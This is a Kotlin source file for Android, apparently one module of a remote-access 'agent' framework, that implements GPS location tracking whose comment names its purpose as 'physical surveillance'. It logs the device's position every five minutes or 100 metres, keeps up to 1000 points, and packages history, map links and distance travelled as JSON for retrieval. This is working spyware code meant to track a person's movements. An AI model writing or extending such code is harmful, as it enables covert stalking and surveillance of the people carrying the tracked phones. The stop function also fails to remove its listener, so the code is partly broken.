package com.redchain.agent.modules

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import androidx.core.app.ActivityCompat
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

/**
 * Geolocation Tracking Module
 * Track phone's GPS location for physical surveillance
 *
 * Requires: ACCESS_FINE_LOCATION permission
 */
object GeolocationModule {

    private val locationHistory = mutableListOf<LocationData>()
    private var isTracking = false

    data class LocationData(
        val latitude: Double,
        val longitude: Double,
        val accuracy: Float,
        val altitude: Double,
        val timestamp: Long
    )

    fun startTracking(context: Context): JSONObject {
        val result = JSONObject()

        // Check permission
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            result.put("status", "error")
            result.put("message", "Location permission not granted")
            return result
        }

        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        val locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                // Save location
                locationHistory.add(
                    LocationData(
                        latitude = location.latitude,
                        longitude = location.longitude,
                        accuracy = location.accuracy,
                        altitude = location.altitude,
                        timestamp = System.currentTimeMillis()
                    )
                )

                // Keep only last 1000 locations
                if (locationHistory.size > 1000) {
                    locationHistory.removeAt(0)
                }
            }

            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }

        try {
            // Request location updates every 5 minutes or 100 meters
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                300000, // 5 minutes
                100f,   // 100 meters
                locationListener
            )

            isTracking = true

            result.put("status", "started")
            result.put("message", "Location tracking started")
            result.put("update_interval", "5 minutes or 100 meters")

        } catch (e: Exception) {
            result.put("status", "error")
            result.put("error", e.message)
        }

        return result
    }

    fun getLocationHistory(): JSONObject {
        val result = JSONObject()
        val locations = JSONArray()

        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

        for (loc in locationHistory) {
            val locJson = JSONObject().apply {
                put("latitude", loc.latitude)
                put("longitude", loc.longitude)
                put("accuracy", loc.accuracy)
                put("altitude", loc.altitude)
                put("timestamp", dateFormat.format(Date(loc.timestamp)))
                put("google_maps_link", "https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
            }
            locations.put(locJson)
        }

        result.put("total_locations", locationHistory.size)
        result.put("tracking_active", isTracking)
        result.put("locations", locations)

        // Add summary if locations exist
        if (locationHistory.isNotEmpty()) {
            val first = locationHistory.first()
            val last = locationHistory.last()

            result.put("first_location", JSONObject().apply {
                put("latitude", first.latitude)
                put("longitude", first.longitude)
                put("timestamp", dateFormat.format(Date(first.timestamp)))
            })

            result.put("latest_location", JSONObject().apply {
                put("latitude", last.latitude)
                put("longitude", last.longitude)
                put("timestamp", dateFormat.format(Date(last.timestamp)))
            })

            // Calculate distance traveled
            var totalDistance = 0f
            for (i in 1 until locationHistory.size) {
                val prev = locationHistory[i - 1]
                val curr = locationHistory[i]

                val results = FloatArray(1)
                Location.distanceBetween(
                    prev.latitude, prev.longitude,
                    curr.latitude, curr.longitude,
                    results
                )
                totalDistance += results[0]
            }

            result.put("total_distance_meters", totalDistance)
            result.put("total_distance_km", totalDistance / 1000)
        }

        return result
    }

    fun getCurrentLocation(context: Context): JSONObject {
        val result = JSONObject()

        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            result.put("status", "error")
            result.put("message", "Location permission not granted")
            return result
        }

        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        try {
            val lastKnown = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)

            if (lastKnown != null) {
                result.put("status", "success")
                result.put("latitude", lastKnown.latitude)
                result.put("longitude", lastKnown.longitude)
                result.put("accuracy", lastKnown.accuracy)
                result.put("altitude", lastKnown.altitude)
                result.put("google_maps_link", "https://maps.google.com/?q=${lastKnown.latitude},${lastKnown.longitude}")
            } else {
                result.put("status", "no_location")
                result.put("message", "No location available yet")
            }

        } catch (e: Exception) {
            result.put("status", "error")
            result.put("error", e.message)
        }

        return result
    }

    fun stopTracking(context: Context) {
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        // Would need to keep reference to listener to stop
        isTracking = false
    }
}
